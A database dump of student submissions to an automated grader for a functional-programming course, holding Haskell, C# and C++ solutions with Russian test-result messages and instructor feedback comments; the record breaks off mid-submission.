(2817, 66, '419046', '2012-10-28 19:25:23', 1, 'diag 1 s = [[s]]\r\n\r\ndiag n s = [x:xs | x <- [1..s - 1], xs <- diag (n - 1) (s - x)] \r\n\r\ncantor1 n s = (diag n s) ++ cantor1 n (s + 1)\r\n\r\ngeneralizedCantor n = cantor1 n 2\r\n', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2818, 78, '419046', '2012-10-28 19:54:47', 1, 'pascal1 xs = zipWith (+) (xs ++ [0]) (0:xs)\r\n\r\npascal = [1]:(map ( xs -> (pascal1 xs)) pascal)\r\n   --- ОК, но вместо xs -> pascal1 xs можно просто pascal1\r\n   --- Те  pascal = [1]:map pascal1 pascal\r\n', 'Выражение имеет неправильное значение: take 6 pascal'),
(2819, 83, '517309', '2012-10-28 19:59:23', 3, 'test', '<br/>Тесты успешно пройдены!'),
(2820, 82, 'alexey.solovyew@gmail.com', '2012-10-28 20:00:03', 0, 'countDifferentVars a b = length a', 'Хитрый тест номер 5 не пройден :(<br/>Подсказка: Списки могут быть и пустыми..'),
(2821, 82, 'alexey.solovyew@gmail.com', '2012-10-28 20:08:00', 0, 'countDifferentVars a b = length b', 'Выражение имеет неправильное значение: countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]'),
(2822, 82, '517309', '2012-10-28 20:17:27', 0, 'countDifferentVars a b = length a', 'Хитрый тест номер 5 не пройден :(<br/>Подсказка: Списки могут быть и пустыми..'),
(2823, 77, '517309', '2012-10-28 20:19:26', 3, 'sqrt2 = [1,4,1,4,2,1,3,5,6,2,3,7,3,0,9,5,0,4,8,8]', 'Не удалось вычислить выражение "sqrt2 !! 98", проверьте правильность синтаксиса'),
(2824, 82, '517309', '2012-10-28 20:20:55', 0, 'countDifferentVars _ _ = 1', 'Выражение имеет неправильное значение: countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]'),
(2825, 81, 'alexey.solovyew@gmail.com', '2012-10-28 20:21:27', 3, 'lst239 = [1..]', 'Выражение имеет неправильное значение: take 15 lst239'),
(2826, 82, '517309', '2012-10-28 20:25:39', 3, 'countDifferentVars _ _ = 1', 'Выражение имеет неправильное значение: countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]'),
(2827, 82, 'alexey.solovyew@gmail.com', '2012-10-28 20:26:26', 0, 'countDifferentVars _ _ = 1', 'Выражение имеет неправильное значение: countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]'),
(2828, 82, 'alexey.solovyew@gmail.com', '2012-10-28 20:34:45', 0, 'countDifferentVars _ _ = 2', 'Выражение имеет неправильное значение: countDifferentVars [([''x''],[''y''])] [[''x'']]'),
(2829, 82, '517309', '2012-10-28 20:36:14', 3, 'test', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(2830, 82, 'alexey.solovyew@gmail.com', '2012-10-28 20:36:53', 1, 'test\r\n', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(2831, 82, '12206137', '2012-10-28 20:42:29', 1, 'import Debug.Trace\r\n\r\n\r\n\r\n(|>) x f = f x\r\n\r\n\r\n\r\ngetChildren pairs vertex =\r\n\r\n    pairs\r\n\r\n    |> foldl (acc (x,y) ->\r\n\r\n                    if x == vertex then y:acc\r\n\r\n                    else if y == vertex then x:acc\r\n\r\n                    else acc)\r\n\r\n             []\r\n\r\n\r\n\r\ndfs was pairs u =\r\n\r\n    u\r\n\r\n    |> getChildren pairs\r\n\r\n    |> foldl (was v -> if any (== v) was then was\r\n\r\n                        else dfs was pairs v)\r\n\r\n             (u:was)\r\n\r\n\r\n\r\ncountDifferentVars pairs vars =\r\n\r\n    vars\r\n\r\n    |> foldl (curR@(cnt,was) curV -> if any (== curV) was then curR\r\n\r\n                                      else (cnt+1, dfs was pairs curV) )\r\n\r\n             (0,[])\r\n\r\n    |> fst\r\n', '<br/>Тесты успешно пройдены!'),
(2832, 81, '419046', '2012-10-28 20:53:07', 1, 'lst239 = lst239'' [2,3,9]\r\n\r\nlst239'' xs = let\r\n\r\n                next = map (x -> [x * 10 + 2, x * 10 + 3, x * 10 + 9]) xs\r\n\r\n                list = foldr (++) [] next\r\n\r\n             in xs ++ (lst239'' list)\r\n', '<br/>Тесты успешно пройдены!'),
(2833, 76, 'erwert', '2012-10-28 21:54:27', 0, 'class Shape a where\r\nperimeter :: a -> Double\r\n\r\ndata Circle = Circle Double\r\ndata Rect = Rect Double Double\r\n\r\ninstance Shape Circle where\r\nperimeter (Circle r) = 2 * pi * r\r\n\r\ninstance Shape Rect where\r\nperimeter (Rect a b) = 2 * (a + b)', 'Не удалось вычислить выражение "perimeter (Circle 0)", проверьте правильность синтаксиса'),
(2834, 68, '4169333', '2012-10-28 22:28:25', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace _1_29_10\r\n{\r\n\r\n    class Program\r\n    {\r\n        static int[] ZeroDigits(int[] a,int n)\r\n        {\r\n            int[] b = a.Select(x => x - (x % ((int)Math.Pow(10, n)))).ToArray();\r\n            return b;\r\n        }\r\n\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            int n = 2;\r\n            int[] a = { 11111, 2222, 4444, 3661, 6613, 7771 };\r\n            int[] b = ZeroDigits(a,n);\r\n            Console.WriteLine("Result: ");\r\n            for (int i = 0; i < b.Length; i++)\r\n            {\r\n                Console.WriteLine(" " + b[i]);\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2835, 67, '4169333', '2012-10-28 22:31:14', 1, '// 02_29_10.cpp : Defines the entry point for the console application.\r\n//\r\n\r\n#include "stdafx.h"\r\n#include <algorithm>   \r\n#include <iostream>\r\n#include <conio.h>\r\n#include "math.h"\r\nusing namespace std;\r\n\r\nvoid ZeroDigits (int a[],int size,int n)\r\n{\r\n	 int*  b = new int[n];	\r\n	 double n1=n;\r\n	 int k=(pow(10,n1));\r\n	 transform (a, a+size, b, [k] (int i) { return (i- i % k); }); \r\n	 cout << "Result: ";\r\n	 for (int i=0; i<size; i++)\r\n	 { \r\n		cout << " " << b[i];\r\n	 }\r\n    \r\n}\r\n\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	int a[] = { 1111,2222,2121,3333,4444};\r\n	int size=5;\r\n	int n=2;\r\n        ZeroDigits(a,size,n);\r\n	getch();\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2836, 76, 'erwert', '2012-10-28 22:40:54', 1, 'data Circle = Circle Double\r\ndata Rect = Rect Double Double\r\n\r\nclass Shape a where\r\n	perimeter :: a -> Double\r\n\r\ninstance Shape Circle where\r\n	perimeter (Circle r) = 2 * pi * r\r\n\r\ninstance Shape Rect where\r\n	perimeter (Rect a b) = 2 * (a + b)\r\n', '<br/>Тесты успешно пройдены!'),
(2837, 82, '2562137', '2012-10-29 01:51:11', 1, 'countDifferentVars eqs vars = length (unique (elim eqs vars))\r\n\r\nunique [] = []\r\nunique (x:xs) = x : unique (filter (y -> y /= x) xs)\r\n   --- или можно filer (/=x)\r\n	\r\nelim [] vars = vars\r\nelim (eq:eqs) vars = \r\n	if (hasboth vars eq)\r\n	then [if (v == valy) then valx else v | v <- vals]\r\n	else vals\r\n	where\r\n		vals = elim eqs vars\r\n		valx = findval (zip vars vals) (fst eq)\r\n		valy = findval (zip vars vals) (snd eq)\r\n\r\nhasboth list p = elem (fst p) list && elem (snd p) list\r\n\r\nfindval (p:ps) x = if (fst p == x) then (snd p) else (findval ps x)\r\n', '<br/>Тесты успешно пройдены!'),
(2838, 78, '4837959', '2012-10-29 08:35:50', 1, 'pascal = [1]:map (xs -> zipWith (+) (0:xs) (xs ++ [0])) pascal', '<br/>Тесты успешно пройдены!'),
(2839, 81, '4837959', '2012-10-29 08:37:45', 1, 'lst239 = [2, 3, 9] ++ foldr (++) [] (map (x -> [x * 10 + 2, x * 10 + 3, x * 10 + 9]) lst239)', '<br/>Тесты успешно пройдены!'),
(2840, 79, 'tonyo', '2012-10-29 09:19:26', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\nusing System.Numerics;\r\n\r\n\r\nnamespace FuncProg\r\n{\r\n    class Pr19_1\r\n    {\r\n        static IEnumerable<int> digits(int n)\r\n        {\r\n            BigInteger x = 1;\r\n            BigInteger y;\r\n            while (true)\r\n            {\r\n                x *= 10;\r\n                y = (x / n) % 10;\r\n                yield return (int)y;\r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            int n = 1;\r\n            foreach (int i in digits(7))\r\n            {\r\n                Console.WriteLine(i);\r\n                if (n++ > 20)\r\n                    break;\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2841, 83, 'tonyo', '2012-10-29 09:32:16', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace FuncProg\r\n{\r\n    class Pr21_1\r\n    {\r\n        static IEnumerable<int> Lst239()\r\n        {\r\n            yield return 2;\r\n            yield return 3;\r\n            yield return 9;\r\n            foreach (int i in Lst239())\r\n            {\r\n                yield return Convert.ToInt32(i.ToString() + "2");\r\n                yield return Convert.ToInt32(i.ToString() + "3");\r\n                yield return Convert.ToInt32(i.ToString() + "9");                \r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            int n = 1;\r\n            foreach (int i in Lst239())\r\n            {\r\n                Console.WriteLine(i);\r\n                if (n++ > 20)\r\n                    break;\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2842, 84, 'tonyo', '2012-10-29 09:45:30', 2, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace FuncProg\r\n{\r\n    class Pr21_2\r\n    {\r\n        static IEnumerable<double> Iterate(double x, Func<double, double> f)\r\n        {\r\n            while (true)\r\n            {\r\n                yield return x;\r\n                x = f(x);\r\n            }\r\n        }\r\n\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            int n = 1;\r\n            foreach (double i in Iterate(1, x => x*2))\r\n            {\r\n                Console.WriteLine(i);\r\n                if (n++ > 20)\r\n                    break;\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2843, 84, 'tonyo', '2012-10-29 10:55:03', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace FuncProg\r\n{\r\n    class Pr21_2\r\n    {\r\n        static IEnumerable<double> Iterate(double x, Func<double, double> f)\r\n        {\r\n            while (true)\r\n            {\r\n                yield return x;\r\n                x = f(x);\r\n            }\r\n        }\r\n\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            int n = 1;\r\n            foreach (double i in Iterate(1, x => x*2))\r\n            {\r\n                Console.WriteLine(i);\r\n                if (n++ > 20)\r\n                    break;\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(2844, 81, '3607492', '2012-10-29 12:34:05', 1, 'mapx f (x:xs) = f [x] ++ mapx f xs\r\n\r\nlst239 =2:3:9:(mapx ((x:xs)-> [( x*10+2),( x*10+3),( x*10+9)]) lst239)', '<br/>Тесты успешно пройдены!'),
(2845, 81, '2562137', '2012-10-29 12:40:02', 1, 'lst239 = 2 : 3 : 9 : foldr (x xs -> 10*x+2 : 10*x+3 : 10*x+9 : xs) [] lst239', '<br/>Тесты успешно пройдены!'),
(2846, 83, '2562137', '2012-10-29 12:46:47', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections;\r\n\r\n\r\n\r\nnamespace TwoThreeNine\r\n\r\n{\r\n\r\n    class MainClass\r\n\r\n    {\r\n\r\n    	/*\r\n\r\n    	 * IEnumerable<int> does not work :(\r\n  --- В начале надо написать using System.Collections.Generic;\r\n  --- тогда, думаю, заработает..\r\n\r\n\r\n    	 */\r\n\r\n\r\n\r\n		static IEnumerable lst239()\r\n\r\n		{\r\n\r\n			yield return 2;\r\n\r\n			yield return 3;\r\n\r\n			yield return 9;\r\n\r\n\r\n\r\n			foreach (int i in lst239())\r\n\r\n			{\r\n\r\n				yield return 10*i+2;\r\n\r\n				yield return 10*i+3;\r\n\r\n				yield return 10*i+9;\r\n\r\n			}\r\n\r\n		}\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n        	int counter = 0;\r\n\r\n        	foreach (int i in lst239())\r\n\r\n        	{\r\n\r\n        		if (counter++ > 20) break;\r\n\r\n        		Console.Write(i + " ");\r\n\r\n        	}\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2847, 84, '2562137', '2012-10-29 12:59:15', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections;\r\n\r\n\r\n\r\nnamespace TwoThreeNine\r\n\r\n{\r\n\r\n    class MainClass\r\n\r\n    {\r\n\r\n    	/*\r\n\r\n    	 * IEnumerable<int> does not work :(\r\n   --- И тут тоже просто надо написать в начале using System.Collections.Generic;\r\n\r\n    	 */\r\n\r\n\r\n\r\n		static IEnumerable Iterate(double x, Func<double, double> f)\r\n\r\n		{\r\n\r\n			while (true)\r\n\r\n			{\r\n\r\n				yield return x;\r\n\r\n				x = f(x);\r\n\r\n			}\r\n\r\n		}\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n        	foreach (double x in Iterate(2, x => x*2))\r\n\r\n			{\r\n\r\n				Console.WriteLine(x);\r\n\r\n				if (x > 1000000) break;\r\n\r\n			}\r\n\r\n\r\n\r\n			int i = 0;\r\n\r\n			foreach (double x in Iterate(1, Math.Sin))\r\n\r\n			{\r\n\r\n				Console.WriteLine(x);\r\n\r\n				if (i++ == 10) break;\r\n\r\n			}\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2848, 79, '4169333', '2012-10-29 15:18:44', 2, 'namespace _1_05_11\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable <double> digits(int n)\r\n        {\r\n            double n1 = n;\r\n            double a = 1 / n1;\r\n   --- Нет, так неполучится.. Попробуйте, например вызявать для n = 3. Сначала, действительно,\r\n   --- будут печататься 33333, но потом примерно с 15 знака начнется что-то странное.\r\n   --- А это потому что как-только вы сосчитали double a = 1/n1, то вы уже считаете знаки не настоящей\r\n   --- математической дроби, а ее приближения в double. И там неизбежно не больше 15 знаков.\r\n   --- Подсказка: тут надо как-то работать только с целыми числами\r\n            double b = 0;\r\n            for (int i = 0; ; i++)\r\n            {\r\n                b = Math.Floor (a);\r\n                a = a - b;\r\n                a = a * 10;\r\n                yield return (b);\r\n            }\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            Int32 n=0;\r\n            n = Convert.ToInt32(Console.ReadLine());\r\n            foreach (int x in digits(n).Take(100))\r\n            {\r\n                 Console.Write(x+",");\r\n            }\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2849, 80, '4169333', '2012-10-29 15:19:16', 2, 'namespace _2_05_11\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable<int> cantor()\r\n        {\r\n            for (int s = 1; ; s++)\r\n            {\r\n                for (int x = 1; x <= s; x++)\r\n                {\r\n                    Console.Write("(");\r\n    --- Нет, это не совсем то.. Тут печатать ничего не надо, а надо возвращать какой-нибудь класс\r\n    --- с двумя целыми полями. Можно воспользоваться стандартным классом KeyValuePair, например.\r\n    --- Попробуйте что-нибудь такое написать, пожалуйста.\r\n                    yield return (x);\r\n                    Console.Write(",");\r\n                    yield return (s - x + 1);\r\n                    Console.Write("),");\r\n\r\n                }\r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            // Take(100) выдает 50 пар\r\n            foreach (int x in cantor().Take(100))\r\n            {\r\n                Console.Write(x);\r\n            }\r\n            Console.Write(")");\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2850, 71, '51559263', '2012-10-29 15:37:44', 1, 'aS (x : xs) sum | abs x < 0.000001 = sum\r\n\r\n                |   otherwise      = aS xs (x + sum)\r\n\r\n\r\n\r\napproxSum xs = aS xs 0\r\n\r\n\r\n\r\nlist n = (1/(n*n)) : list (n + 1)\r\n  --- Тут проще, видимо, использовать list comprehension \r\n\r\n\r\nz = approxSum ( list 1 )\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2851, 75, '383483', '2012-10-29 16:15:51', 1, 'foldr f e (x:xs) = f x (foldr f e xs)\r\nfoldr f e [] = e\r\n\r\na1->a2->a3->a4 \r\n\r\n1. ничего не знаем про аргументы.\r\n2. (x:xs) имеет тип a3 => a3=[a5]\r\n3. a1 = функция от двух аргументов => a1 = (a6->a7->a8)\r\n   Получаем: (a6->a7->a8)->a2->[a5]->a4\r\n4. a6=a5, т.к. у f это первые аргументы, и один = x\r\n5. a4 = a7, т.к. f принимает вторым аргументом результат foldr\r\n6. a2 = a4, т.к. по второй строчке, возвращается e — второй аргумент\r\n7. a8 = a4, т.к. результат f возвращается как результат foldr\r\nТ.о. (a5->a4->a4)->a4->[a5]->a4\r\nили foldr::(a->b->b)->b->[a]->b', '<br/>Тесты успешно пройдены!'),
(2852, 72, '51559263', '2012-10-29 16:51:36', 1, 'mask = 0 : 0 : 0 : 0 : 0 : 1 : 1 : mask\r\n\r\n\r\n\r\nweekendExpences = sum.zipWith (*) mask\r\n', '<br/>Тесты успешно пройдены!'),
(2853, 82, '3607492', '2012-10-29 17:08:38', 2, '--- Я по техническим причинам в тестах вместо имен переменных использовал числа, и у вас из-за \r\n--- этого не компилируется. Это моя вина, извините, так получилось.\r\n--- Но все равно, если в тесте заменить все числа на строки, как-то так:\r\n---  countDifferentVars [("z1","z3"),("z2","z3")] ["z1","z4","z2","z3","z1"]\r\n--- то ваша программа вроде бы работает неправильно, у меня она ломается.\r\n--- Посмотрите, пожалуйста.\r\n\r\n\r\n\r\nconcatEquals _ _ [] z ((a,b):(c,d):[]) = (a,b++d):z\r\n\r\nconcatEquals t1 t2 ((a,b):xs) z z1= if (a==t1 || a==t2) then concatEquals t1 t2 xs z ((a,b):z1) else concatEquals t1 t2 xs ((a,b):z) z1\r\n\r\nconcatEquals _ _ _ _ _ = []\r\n\r\n\r\n\r\naddEquals t1 z ((a,b):xs) = if (t1==a) then (a,z:b):xs else (a,b):(addEquals t1 z xs)\r\n\r\n\r\n\r\ncreateEqual a b z t= (t,[a,b]):z\r\n\r\n\r\n\r\ncheckValue [] _ = False\r\n\r\ncheckValue (x:xs) v = if (x==v) then True else checkValue xs v\r\n\r\n\r\n\r\ncheckEquals [] _ = -1;\r\n\r\ncheckEquals ((a,b):xs) v =  if (checkValue b v) then a else checkEquals xs v\r\n\r\n\r\n\r\ncreateEquals::[([Char],[Char])]->[(Int,[[Char]])]->Int->[(Int,[[Char]])]\r\n\r\ncreateEquals [] z _ = z\r\n\r\ncreateEquals ((a,b):as) z t = if (t1 > 0) then \r\n\r\n											if (t2 > 0)\r\n\r\n												then createEquals as (concatEquals t1 t2 z [] []) (t+1)\r\n\r\n												else createEquals as (addEquals t1 b z) (t+1)\r\n\r\n										else\r\n\r\n											if (t2 > 0)\r\n\r\n												then createEquals as (addEquals t1 a z) (t+1)\r\n\r\n												else createEquals as (createEqual a b z t) (t+1)\r\n\r\n\r\n\r\n							where \r\n\r\n								t1=checkEquals z a\r\n\r\n								t2=checkEquals z b \r\n\r\n\r\n\r\ncheckList [] _ res = res\r\n\r\ncheckList (y:ys) eq res = if (t>0) then checkList ys eq ((show t):res) else checkList ys eq (y:res)\r\n\r\n					where t = checkEquals eq y\r\n\r\n\r\n\r\nremoveDuplicates [] = []\r\n\r\nremoveDuplicates (x:xs) = x:removeDuplicates(filter (y ->not (x==y)) xs)\r\n\r\n\r\n\r\ncountDifferentVars x y = length (removeDuplicates(checkList y eq []))\r\n\r\n	where eq = createEquals x [] 1\r\n\r\n\r\n', 'Не удалось вычислить выражение "countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]", проверьте правильность синтаксиса'),
(2854, 76, '51559263', '2012-10-29 17:13:53', 1, 'data Rect = Rect Double Double\r\n\r\n\r\n\r\ndata Circle = Circle Double\r\n\r\n\r\n\r\nclass Shape a where\r\n\r\n      perimeter :: a -> Double\r\n\r\n\r\n\r\ninstance Shape Rect where\r\n\r\n         perimeter (Rect x y) = 2 * ( x + y )\r\n\r\n\r\n\r\ninstance Shape Circle where\r\n\r\n         perimeter (Circle r) = 2 * pi * r\r\n\r\n      \r\n', '<br/>Тесты успешно пройдены!'),
(2855, 82, '3607492', '2012-10-29 17:19:05', 0, '', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(2856, 82, '3607492', '2012-10-29 17:19:21', 0, '\n\nconcatEquals _ _ [] z ((a,b):(c,d):[]) = (a,b++d):z\n\nconcatEquals t1 t2 ((a,b):xs) z z1= if (a==t1 || a==t2) then concatEquals t1 t2 xs z ((a,b):z1) else concatEquals t1 t2 xs ((a,b):z) z1\n\nconcatEquals _ _ _ _ _ = []\n\n\n\naddEquals t1 z ((a,b):xs) = if (t1==a) then (a,z:b):xs else (a,b):(addEquals t1 z xs)\n\naddEquals _ _ z = z\n\n\n\ncreateEqual a b z t= (t,[a,b]):z\n\n\n\ncheckValue [] _ = False\n\ncheckValue (x:xs) v = if (x==v) then True else checkValue xs v\n\n\n\ncheckEquals [] _ = -1;\n\ncheckEquals ((a,b):xs) v =  if (checkValue b v) then a else checkEquals xs v\n\n\n\ncreateEquals [] z _ = z\n\ncreateEquals ((a,b):as) z t = if (t1 > 0) then \n\n											if (t2 > 0)\n\n												then createEquals as (concatEquals t1 t2 z [] []) (t+1)\n\n												else createEquals as (addEquals t1 b z) (t+1)\n\n										else\n\n											if (t2 > 0)\n\n												then createEquals as (addEquals t2 a z) (t+1)\n\n												else createEquals as (createEqual a b z t) (t+1)\n\n\n\n							where \n\n								t1=checkEquals z a\n\n								t2=checkEquals z b \n\n\n\ncheckList [] _ res = res\n\ncheckList (y:ys) eq res = if (t>0) then checkList ys eq ("t":res) else checkList ys eq (y:res)\n\n					where t = checkEquals eq y\n\n\n\nremoveDuplicates [] = []\n\nremoveDuplicates (x:xs) = x:removeDuplicates(filter (y ->not (x==y)) xs)\n\n\n\ntestvars x y = length (removeDuplicates(checkList y eq []))\n\n	where eq = createEquals x [] 1\n\n\n\ntostr x = map (z->(show z)) x\n\ntostrPair x = map ((a,b)->(show a,show b)) x\n\n\n\ncountDifferentVars x y = testvars (tostrPair x) (tostr y)\n\n\n\n--main = print(countDifferentVars [(1,3),(2,3)] [1,4,2,3,1])\n', 'Выражение имеет неправильное значение: countDifferentVars [(1,2),(2,3), (4,5)] [1,7,2,3,1,4,5]'),
(2857, 82, '3607492', '2012-10-29 17:21:10', 0, '', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(2858, 82, '3607492', '2012-10-29 17:21:23', 0, '\n\nconcatEquals _ _ [] z ((a,b):(c,d):[]) = (a,b++d):z\n\nconcatEquals t1 t2 ((a,b):xs) z z1= if (a==t1 || a==t2) then concatEquals t1 t2 xs z ((a,b):z1) else concatEquals t1 t2 xs ((a,b):z) z1\n\nconcatEquals _ _ _ _ _ = []\n\n\n\naddEquals t1 z ((a,b):xs) = if (t1==a) then (a,z:b):xs else (a,b):(addEquals t1 z xs)\n\naddEquals _ _ z = z\n\n\n\ncreateEqual a b z t= (t,[a,b]):z\n\n\n\ncheckValue [] _ = False\n\ncheckValue (x:xs) v = if (x==v) then True else checkValue xs v\n\n\n\ncheckEquals [] _ = -1;\n\ncheckEquals ((a,b):xs) v =  if (checkValue b v) then a else checkEquals xs v\n\n\n\ncreateEquals [] z _ = z\n\ncreateEquals ((a,b):as) z t = if (t1 > 0) then \n\n											if (t2 > 0)\n\n												then createEquals as (concatEquals t1 t2 z [] []) (t+1)\n\n												else createEquals as (addEquals t1 b z) (t+1)\n\n										else\n\n											if (t2 > 0)\n\n												then createEquals as (addEquals t2 a z) (t+1)\n\n												else createEquals as (createEqual a b z t) (t+1)\n\n\n\n							where \n\n								t1=checkEquals z a\n\n								t2=checkEquals z b \n\n\n\ncheckList [] _ res = res\n\ncheckList (y:ys) eq res = if (t>0) then checkList ys eq ((show t):res) else checkList ys eq (y:res)\n\n					where t = checkEquals eq y\n\n\n\nremoveDuplicates [] = []\n\nremoveDuplicates (x:xs) = x:removeDuplicates(filter (y ->not (x==y)) xs)\n\n\n\ntestvars x y =  length (removeDuplicates(checkList y eq []))\n\n	where eq = createEquals x [] 1\n\n\n\ntostr x = map (z->(show z)) x\n\ntostrPair x = map ((a,b)->(show a,show b)) x\n\n\n\ncountDifferentVars x y = testvars (tostrPair x) (tostr y)\n\n\n\n--main = print(countDifferentVars [(1,2),(2,3),(4,5)] [1,7,2,3,1,4,5])\n', 'Выражение имеет неправильное значение: countDifferentVars [(1,2),(2,1)] [1,2,3]'),
(2859, 82, '3607492', '2012-10-29 17:23:25', 2, '  --- Не совсем так, вот такой тест не проходит:\r\n  ---  countDifferentVars [(1,3),(3,2),(2,1),(8,9)] [1,2,3,4,8,9]\r\n  --- У вас возвращается 2, а дб 3\r\n  --- Посмотрите, пожалуйста (а я сейчас добавлю этот тест)\r\nconcatEquals _ _ [] z ((a,b):(c,d):[]) = (a,b++d):z\r\n\r\nconcatEquals t1 t2 ((a,b):xs) z z1= if (t1==t2) then (a,b):xs else if (a==t1 || a==t2) then concatEquals t1 t2 xs z ((a,b):z1) else concatEquals t1 t2 xs ((a,b):z) z1\r\n\r\nconcatEquals _ _ _ _ _ = []\r\n\r\n\r\n\r\naddEquals t1 z ((a,b):xs) = if (t1==a) then (a,z:b):xs else (a,b):(addEquals t1 z xs)\r\n\r\naddEquals _ _ z = z\r\n\r\n\r\n\r\ncreateEqual a b z t= (t,[a,b]):z\r\n\r\n\r\n\r\ncheckValue [] _ = False\r\n\r\ncheckValue (x:xs) v = if (x==v) then True else checkValue xs v\r\n\r\n\r\n\r\ncheckEquals [] _ = -1;\r\n\r\ncheckEquals ((a,b):xs) v =  if (checkValue b v) then a else checkEquals xs v\r\n\r\n\r\n\r\ncreateEquals [] z _ = z\r\n\r\ncreateEquals ((a,b):as) z t = if (t1 > 0) then \r\n\r\n											if (t2 > 0)\r\n\r\n												then createEquals as (concatEquals t1 t2 z [] []) (t+1)\r\n\r\n												else createEquals as (addEquals t1 b z) (t+1)\r\n\r\n										else\r\n\r\n											if (t2 > 0)\r\n\r\n												then createEquals as (addEquals t2 a z) (t+1)\r\n\r\n												else createEquals as (createEqual a b z t) (t+1)\r\n\r\n\r\n\r\n							where \r\n\r\n								t1=checkEquals z a\r\n\r\n								t2=checkEquals z b \r\n\r\n\r\n\r\ncheckList [] _ res = res\r\n\r\ncheckList (y:ys) eq res = if (t>0) then checkList ys eq ((show t):res) else checkList ys eq (y:res)\r\n\r\n					where t = checkEquals eq y\r\n\r\n\r\n\r\nremoveDuplicates [] = []\r\n\r\nremoveDuplicates (x:xs) = x:removeDuplicates(filter (y ->not (x==y)) xs)\r\n\r\n\r\n\r\ntestvars x y = length (removeDuplicates(checkList y eq []))\r\n\r\n	where eq = createEquals x [] 1\r\n\r\n\r\n\r\ntostr x = map (z->(show z)) x\r\n\r\ntostrPair x = map ((a,b)->(show a,show b)) x\r\n\r\n\r\n\r\ncountDifferentVars x y = testvars (tostrPair x) (tostr y)\r\n\r\n\r\n\r\n--main = print(countDifferentVars [(1,2),(2,1)] [1,2,3])', '<br/>Тесты успешно пройдены!'),
(2860, 74, '51559263', '2012-10-29 17:51:10', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\n\r\n\r\nfoldTree f e Empty = e\r\n\r\n\r\n\r\nfoldTree f e ( Node x l r ) = let\r\n\r\n                                 lres = foldTree f e l\r\n\r\n                                 rres = foldTree f e r\r\n\r\n                              in f x lres rres\r\n\r\n\r\n\r\nsumPos tree = foldTree (  x y z -> let \r\n\r\n                                       yz = y + z\r\n\r\n                                    in if (x <= 0) then yz\r\n\r\n                                       else x + yz ) \r\n\r\n                       0 \r\n\r\n                       tree\r\n', '<br/>Тесты успешно пройдены!'),
(2861, 79, '318210', '2012-10-29 18:05:17', 1, '   --- ОК, но тут, кстати, совсем не нужны BigInteger.. Представьте что вы считаете,\r\n   --- дробь 1/n на бумаге в столбик. Вам, на самом деле, нужен на каждом шагу остаток\r\n   --- от деления на n. Те вполне можно обойтись int. \r\n   --- Но ОК, неважно, засчитано, очень хорошо.\r\n﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\nusing System.Numerics;\r\n\r\n\r\n\r\nnamespace digits191\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static int cntDigit(BigInteger num, BigInteger n, BigInteger cmp)\r\n\r\n        {\r\n\r\n            BigInteger newcmp = BigInteger.Multiply( cmp, (BigInteger) 10 );\r\n\r\n            BigInteger newnum = BigInteger.Multiply( num, (BigInteger) 10 );\r\n\r\n            for (int i = 1; i < 10; i++) 